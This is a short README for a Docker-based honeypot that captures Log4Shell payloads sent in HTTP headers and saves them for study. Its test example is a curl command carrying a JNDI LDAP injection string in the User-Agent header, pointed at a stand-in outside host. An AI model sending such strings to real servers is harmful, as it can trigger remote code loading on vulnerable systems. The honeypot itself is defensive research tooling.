# log4shell-honeypot
Catch and download `log4shell` payloads sent within HTTP headers. Modified version of [Adikso's minecraft honeypot](https://github.com/Adikso/minecraft-log4j-honeypot)

## Setup
1. `git clone $repo`
2. `docker-compose up`
3. Send payloads within a http header to `$dockerip:$port`

To add additional honeypots on different ports, copy and paste an existing service within `docker-compose.yml`, changing the service name, and alter the ports within `ports` and `command`.
```bash
curl --user-agent '${jndi:ldap://lmao.com:1389/a}' http://localhost:80
```

Payloads are saved within `payloads/`

Logs are printed to the screen by default, but can be retreived with `docker inspect`. e.g: 
```bash
docker inspect --format='{{.LogPath}}' log4shell-honeypot_http_1 | xargs cat
```